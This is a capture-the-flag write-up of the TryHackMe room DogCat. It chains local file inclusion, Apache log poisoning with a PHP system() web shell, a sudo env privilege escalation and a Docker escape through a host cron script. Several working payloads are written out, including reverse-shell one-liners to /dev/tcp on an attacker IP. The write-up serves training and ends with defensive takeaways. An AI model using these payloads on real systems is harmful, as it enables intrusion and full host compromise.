Written by Sibongamandla Mnyandu

# DogCat Writeup

## Introduction

DogCat is a TryHackMe room that starts as a simple gallery app for viewing pictures of dogs and cats. But under the hood, it's a chain of misconfigurations. What begins as a Local File Inclusion (LFI) vulnerability escalates into log poisoning for Remote Code Execution (RCE), then abuses a careless sudo rule, and finally breaks out of a Docker container to root the host machine.

This writeup walks through how I rooted the machine on TryHackMe (https://tryhackme.com/room/dogcat) and recovered all four flags.

## CTF Background

- **Target IP:** `10.80.184.61`
- **Attacker box:** Kali Linux
- **Tooling:** Firefox, Nmap, curl, netcat, CyberChef, browser Inspector
- **Objective:** Exploit the web application to find four flags, culminating in a root shell on the host machine.

---

## Reconnaissance & Enumeration

Before attacking any machine, the first step is always to perform our initial reconnaissance to map out exposed ports and running services. I started by running an Nmap scan against the target IP:

```bash
nmap -sC -sV -Pn 10.80.184.61
```

The scan reveals two open ports:
- **Port 22/tcp (SSH):** OpenSSH 7.6p1 (Ubuntu)
- **Port 80/tcp (HTTP):** Apache httpd 2.4.38 (Debian)

With SSH requiring credentials, port 80 is the obvious entry point. 

Navigating to `http://10.80.184.61` in the browser presents a simple gallery with buttons to view a dog or a cat. Clicking them appends a `?view` parameter to the URL (e.g., `?view=dog`), which immediately flags a potential Local File Inclusion (LFI) vulnerability.

---

## Initial Access: Local File Inclusion

### First flag

Testing the `?view` parameter confirms LFI is present, but there's a catch. The application appends `.php` to the file path, and it enforces that the string "dog" or "cat" is part of the filename. 

To bypass the `.php` execution and read the actual source code, I used the `php://filter` wrapper. By asking the server to base64 encode the output, it drops the source code right into the browser without executing it. I included `dog` in the path to satisfy the application's filter:

```
?view=php://filter/read=convert.base64-encode/resource=dog/../flag
```

![Using PHP filter to extract base64 encoded flag](screenshots/Screenshot%202026-08-14%20at%2018.06.01.png)

Decoding the base64 string reveals the first flag:

```
THM{Th1s_1s_N0t_4_Bug_Th1s_1s_4_F34tur3~}
```

![Decoding the base64 to get Flag 1](screenshots/Screenshot%202026-08-14%20at%2018.18.53.png)

---

## Foothold: Log Poisoning to RCE

LFI is great for reading files, but I needed execution. By decoding `index.php`, I discovered the application checks for an `ext` parameter:

```php
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
```

By appending `&ext=` to the URL, I could completely nullify the hardcoded `.php` extension. This allowed me to read arbitrary system files, including the Apache access log:

```
?view=../../../../var/log/apache2/access.log&ext=
```

![Viewing the Apache access log](screenshots/Screenshot%202026-08-14%20at%2018.52.41.png)

Since the access log records the `User-Agent` of incoming HTTP requests, I poisoned the log by sending a request with a PHP command execution payload in the `User-Agent` header:

```php
<?php system($_GET['cmd']); ?>
```

When including the log file via the LFI vulnerability, the Apache server executed the injected PHP code. Passing commands via the `&cmd=` parameter handed me Remote Code Execution (RCE):

```
&cmd=ls -la
```

![Executing commands via poisoned log](screenshots/Screenshot%202026-08-14%20at%2019.23.58.png)

### Second flag

With RCE established, I explored the filesystem. Listing the parent directory (`cmd=ls -la ../../`) exposed the second flag file in the web root:

![Finding Flag 2 in the directory](screenshots/Screenshot%202026-08-14%20at%2019.42.09.png)

Reading `flag2_QMW7JvaY2LvK.txt` yielded the second flag:

```
THM{LF1_t0_RC3_aec3fb}
```

![Reading Flag 2](screenshots/Screenshot%202026-08-14%20at%2019.44.51.png)

### Catching an Interactive Shell

Executing complex commands through URL parameters quickly runs into URL-encoding and quoting issues. To get a stable terminal, I used the web shell to write a dedicated PHP reverse shell script (`rev.php`) into `/var/www/html/`:

```bash
curl -G --data-urlencode "cmd=echo '<?php system(\"bash -c \\\"bash -i >& /dev/tcp/192.168.128.105/1234 0>&1\\\"\"); ?>' > /var/www/html/rev.php" "http://10.80.184.61/?view=./dog/../../../../../../../var/log/apache2/access.log&ext="
```

After starting a Netcat listener on my Kali box (`nc -lvnp 1234`), I requested `http://10.80.184.61/rev.php` to catch an interactive shell as `www-data`:

![Interactive reverse shell caught as www-data](screenshots/Screenshot%202026-08-14%20at%2021.47.55.png)

---

## Privilege Escalation

### Third flag

Inside my interactive shell, I checked the privileges of the `www-data` account with `sudo -l`:

```bash
sudo -l
```

The output confirmed that `www-data` can run `/usr/bin/env` as root without supplying a password:

```
User www-data may run the following commands on 98839fd2933e:
    (root) NOPASSWD: /usr/bin/env
```

![Checking sudo permissions](screenshots/Screenshot%202026-08-14%20at%2020.00.29.png)

Using GTFOBins, abusing `env` with sudo immediately spawned a root shell inside the container:

```bash
sudo /usr/bin/env /bin/bash
```

Listing `/root` revealed `flag3.txt`:

![Listing the root directory](screenshots/Screenshot%202026-08-14%20at%2020.04.25.png)

Reading the file gave me the third flag:

```
THM{D1ff3r3nt_3nv1ronments_874112}
```

![Reading Flag 3](screenshots/Screenshot%202026-08-14%20at%2020.06.10.png)

---

## Container Escape: Root Shell

### Fourth flag

The string inside the third flag ("Different environments") and hostname `98839fd2933e` confirmed that I was operating inside a Docker container.

Enumerating `/opt/backups` revealed an archive file (`backup.tar`) alongside a script named `backup.sh`:

![Finding the backups directory](screenshots/Screenshot%202026-08-14%20at%2020.35.42.png)

Because the archive had a recent timestamp, it meant the underlying host machine was periodically running `backup.sh` via a cron job. Since I had root access inside the container, I could edit `backup.sh` to execute commands on the host.

I appended a reverse shell payload to `backup.sh`:

```bash
echo "#!/bin/bash" > /opt/backups/backup.sh
echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.128.105/1234 0>&1'" >> /opt/backups/backup.sh
```

I kept my Netcat listener running, and within a minute the host's cron job executed the poisoned script, catching a root shell directly on the host machine (`root@dogcat`):

![Root shell on the host machine](screenshots/Screenshot%202026-08-14%20at%2021.44.16.png)

From the host shell, reading `/root/flag4.txt` closed out the room:

```bash
cat /root/flag4.txt
```

---

## Takeaways

This box is a textbook demonstration of chaining multiple minor security flaws into full host compromise:

1. **Input Validation Failures (LFI):** Relying on simple substring checks (`containsStr`) and dynamic includes without proper path whitelisting allowed arbitrary file reading via PHP filters and path traversal.
2. **Log File Permissions & Poisoning:** Storing readable access logs on the same filesystem as a dynamic inclusion flaw enabled an easy upgrade from file disclosure to Remote Code Execution.
3. **Over-permissive Sudo Privileges:** Granting passwordless execution of a versatile binary like `/usr/bin/env` completely invalidated the container's internal permission model.
4. **Insecure Host-Container Interactions:** Running a host-level cron job that executes a script residing inside a container created a critical breakout vector, turning container root access into host root access.

## References

- [TryHackMe: DogCat](https://tryhackme.com/room/dogcat)
- [OWASP Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [Log Poisoning to RCE (HackTricks)](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-apache-log-poisoning)
- [GTFOBins: env](https://gtfobins.github.io/gtfobins/env/)
